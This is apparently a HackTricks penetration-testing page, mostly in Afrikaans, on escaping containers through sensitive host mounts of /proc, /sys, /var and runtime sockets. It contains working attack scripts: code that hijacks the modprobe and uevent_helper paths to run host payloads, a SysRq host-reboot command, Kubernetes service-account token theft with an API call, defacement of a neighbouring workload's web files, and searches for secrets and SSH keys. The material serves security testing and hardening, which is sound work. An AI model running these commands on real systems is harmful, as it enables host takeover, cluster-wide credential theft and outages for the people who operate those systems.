# Gevoelige Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host-monteerplekke is een van die belangrikste praktiese container-escape-oppervlakke omdat hulle dikwels 'n sorgvuldig geïsoleerde prosesuitsig laat inklap tot direkte sigbaarheid van host-hulpbronne. Die gevaarlike gevalle beperk zich nie tot `/` nie. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, of toestelverwante paadjies kan kernel-beheerkontroles, credentials, naburige container-lêerstelsels, en runtime-bestuursinterfaces openbaar.

Hierdie bladsy bestaan afsonderlik van die individuele beskermingsbladsye omdat die misbruikmodel deurkruisend is. 'n Skryfbare host-monteerplek is gevaarlik deels as gevolg van mount namespaces, deels as gevolg van user namespaces, deels as gevolg van AppArmor of SELinux-dekking, en deels as gevolg van watter presiese host-pad blootgestel is. Dit as 'n eie onderwerp te behandel maak die aanvalsoorvlak baie makliker om oor te redeneer.

## `/proc` Blootstelling

procfs bevat beide gewone prosesinligting en hoog-impak kernel control interfaces. 'n Bind mount soos `-v /proc:/host/proc` of 'n container-uitsig wat onverwagte skryfbare proc-inskrywings openbaar kan daarom lei tot inligtingsvrystelling, denial of service, of direkte host-kode-uitvoering.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur te kontroleer watter hoë-waarde procfs-inskrywings sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paaie is interessant om verskillende redes. `core_pattern`, `modprobe`, en `binfmt_misc` kan host code-execution paaie word as hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore`, en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` openbaar proses-, cgroup- en filesystem-konteks wat kan help om die host-uitsig van binne die container te herbou.

Die praktiese waarde van elke pad verskil, en om almal asof hulle dieselfde impak het te behandel maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
  Indien skryfbaar, is dit een van die hoogste-impak procfs-paaie omdat die kernel 'n pipe handler sal uitvoer ná 'n crash. 'n Container wat `core_pattern` na 'n payload in sy overlay of in 'n gemounte host-pad kan wys, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir 'n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
  Hierdie pad beheer die userspace helper wat die kernel gebruik wanneer dit module-loading logika moet aanroep. As dit vanuit die container skryfbaar is en in die host-konteks geïnterpreteer word, kan dit 'n ander host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met 'n manier om die helper-pad te trigger.
- `/proc/sys/vm/panic_on_oom`
  Dit is gewoonlik nie 'n skoon escape-primitive nie, maar dit kan geheue-druk omskakel in host-wye denial of service deur OOM-voorwaardes in kernel panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
  As die registration interface skryfbaar is, kan die aanvaller 'n handler registreer vir 'n gekose magic value en host-context uitvoering verkry wanneer 'n bypassende lêer uitgevoer word.
- `/proc/config.gz`
  Nuttig vir kernel exploit triage. Dit help bepaal watter subsisteme, mitigations, en opsionele kernel-kenmerke geaktiveer is sonder om host package metadata nodig te hê.
- `/proc/sysrq-trigger`
  Meestal 'n denial-of-service-pad, maar 'n baie ernstige een. Dit kan onmiddellik reboot, panic, of andersins die host ontwrig.
- `/proc/kmsg`
  Reveals kernel ring buffer messages. Nuttig vir host fingerprinting, crash-analise, en in sekere omgewings vir die leaking van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
  Waardevol wanneer leesbaar omdat dit geëksporteerde kernel symbol-inligting blootstel en kan help om address randomization-aanname te ontwrig tydens kernel exploit ontwikkeling.
- `/proc/[pid]/mem`
  Dit is 'n direkte proses-geheue-koppelvlak. As die teikenproses bereikbaar is met die nodige ptrace-style voorwaardes, kan dit toelaat om 'n ander proses se geheue te lees of te wysig. Die realistiese impak hang swaar af van credentials, `hidepid`, Yama, en ptrace-restriksies, so dit is 'n kragtige maar voorwaardelike pad.
- `/proc/kcore`
  Exposes 'n core-image-style siening van stelselgeheue. Die lêer is enorm en onhandig om te gebruik, maar as dit betekenisvol leesbaar is dui dit op 'n sleg blootgestelde host memory surface.
- `/proc/kmem` and `/proc/mem`
  Histories hoë-impak raw memory interfaces. Op baie moderne stelsels is hulle gedeaktiveer of swaar beperk, maar as hulle teenwoordig en bruikbaar is moet hulle as kritiese bevindinge behandel word.
- `/proc/sched_debug`
  Leaks scheduling- en taak-inligting wat host proses-identiteite kan openbaar selfs wanneer ander proses-uitsigte skoner lyk as verwag.
- `/proc/[pid]/mountinfo`
  Ekstreme nuttig om te rekonstruer waar die container werklik op die host woon, watter paaie overlay-backed is, en of 'n skryfbare mount ooreenstem met host content of slegs met die container layer.

As `/proc/[pid]/mountinfo` of overlay-besonderhede leesbaar is, gebruik dit om die host path van die container filesystem te herstel:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat 'n aantal host-execution truuks vereis dat 'n pad binne die container omskakel word na die ooreenstemmende pad vanuit die gasheer se oogpunt.

### Volledige voorbeeld: `modprobe` Helper Path Abuse

Indien `/proc/sys/kernel/modprobe` vanuit die container skryfbaar is en die helper-pad in die gasheer-konteks geïnterpreteer word, kan dit na 'n deur 'n aanvaller beheerste payload herlei word:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese uitloser hang af van die teiken en die kernel se gedrag, maar die belangrike punt is dat 'n skryfbare helper-pad 'n toekomstige kernel-helper-oproep na aanvallersbeheerde host-path content kan herlei.

### Volledige Voorbeeld: Kernel Recon met `kallsyms`, `kmsg`, en `config.gz`

As die doel exploitability assessment is eerder as onmiddellike escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand openbaar, en watter kernel-funksies of versagtingsmaatreëls gekompileer is. Die impak is gewoonlik nie direct escape nie, maar dit kan die triage van kernel-kwetsbaarhede aansienlik verkort.

### Full Example: SysRq Host Reboot

As `/proc/sysrq-trigger` skryfbaar is en die host view bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die gevolg is 'n onmiddellike herbegin van die host. Dit is nie 'n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling veel ernstiger kan wees as inligtingsvrystelling.

## `/sys` Blootstelling

sysfs stel groot hoeveelhede kernel- en toesteltoestand bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, security-module-konfigurasie, of firmwaretoestand kan beïnvloed.

Hoëwaarde sysfs-paaie sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan termiese bestuursgedrag beïnvloed en dus die stabiliteit van die host in swak blootgestelde omgewings beïnvloed. `/sys/kernel/vmcoreinfo` kan leak crash-dump en kernel-layout-inligting wat help met laevlak host fingerprinting. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, so onverwagte toegang daar kan MAC-verwante toestand openbaar of verander. EFI-variabelepaaie kan firmware-ondersteunde opstartinstellings beïnvloed, wat dit baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is besonders gevaarlik omdat dit doelbewus 'n ontwikkelaar-gerigte koppelvlak is met veel minder veiligheidsverwachtinge as geharde produksiegerigte kernel-APIs.

Nuttige opdragte om hierdie paaie te kontroleer is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
- `/sys/kernel/security` kan aandui of AppArmor, SELinux, of 'n ander LSM-oppervlak sigbaar is op 'n wyse wat slegs aan die gasheer behoort te bly.
- `/sys/kernel/debug` is dikwels die mees verontrustende bevinding in hierdie groep. As `debugfs` gemonteer en leesbaar of skryfbaar is, verwag 'n wye kernel-gekoppelde oppervlak waarvan die presiese risiko afhang van die geaktiveerde debug nodes.
- EFI-variabele blootstelling is minder algemeen, maar as dit teenwoordig is het dit 'n hoë impak omdat dit firmware-ondersteunde instellings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir gasheerstabiliteit en hardeware-interaksie, nie vir netjiese shell-styl escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik 'n bron vir host-fingerprinting en crash-analysis, nuttig om laevlak kerneltoestand te verstaan.

### Full Example: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel 'n aanvaller-beheerde helper uitvoer wanneer 'n `uevent` geaktiveer word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk is dat die helperpad vanuit die gasheer se oogpunt geïnterpreteer word. Sodra dit geaktiveer word, hardloop die helper in die gasheer-konteks eerder as binne die huidige container.

## `/var` Blootstelling

Om die gasheer se `/var` in 'n container te mount word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om runtime-sokette, container snapshot-direktories, kubelet-managed pod volumes, geprojekteerde service-account tokens en naburige toepassingslêerstelsels te bereik. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container-toestand eintlik woon.

### Kubernetes Voorbeeld

'n pod met `hostPath: /var` kan dikwels die geprojekteerde tokens van ander pods lees en overlay-snapshot-inhoud:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle aandui of die mount slegs onbeduidende toepassingsdata blootstel of hoë-impak cluster credentials. 'n Leesbare service-account token kan onmiddellik local code execution in Kubernetes API access omskep.

As die token teenwoordig is, valideer wat dit kan bereik in plaas daarvan om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan baie groter wees as die toegang tot die plaaslike node. 'n token met uitgebreide RBAC kan 'n gemonteerde `/var` in 'n klusterwye kompromittering omskep.

### Docker en containerd Voorbeeld

Op Docker-gashere is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-ondersteunde Kubernetes-nodes moontlik onder `/var/lib/containerd` of snapshotter-spesifieke paaie is:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van 'n ander workload openbaar, kan die aanvaller moontlik toepassingslêers verander, webinhoud plant of opstartskripte wysig sonder om die huidige container-konfigurasie aan te raak.

Konkrete misbruikidees sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie opdragte is nuttig omdat hulle die drie hoof-impakfamilies van die gemonteerde `/var` aantoon: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Runtime-sokette

Sensitiewe host-monteerings sluit dikwels runtime-sokette in, eerder as volledige gidse. Dit is so belangrik dat dit hier uitdruklik herhaal moet word:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets mounted is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Mount-Related CVEs

Host mounts also intersect with runtime vulnerabilities. Important recent examples include:

- `CVE-2024-21626` in `runc`, waar 'n leaked directory file descriptor die werkende gids op die host-lêerstelsel kon plaas.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, waar OverlayFS copy-up races tydens builds host-path writes kon produseer.
- `CVE-2024-1753` in Buildah and Podman build flows, waar crafted bind mounts tydens build `/` read-write kon blootstel.
- `CVE-2024-40635` in containerd, waar 'n groot `User` waarde kon oorloop in UID 0-gedrag.

These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat hier interessant is:

- Host root, `/proc`, `/sys`, `/var` en runtime-sokette is almal bevindinge van hoë prioriteit.
- Skryfbare proc/sys-insette beteken dikwels dat die mount gasheer-globale kernelbeheer blootstel eerder as 'n veilige container-uitsig.
- Gemonteerde `/var`-pade verdien 'n beoordeling van inlogbewyse en naburige workloads, nie net 'n beoordeling van die lêerstelsel nie.
{{#include ../../../banners/hacktricks-training.md}}
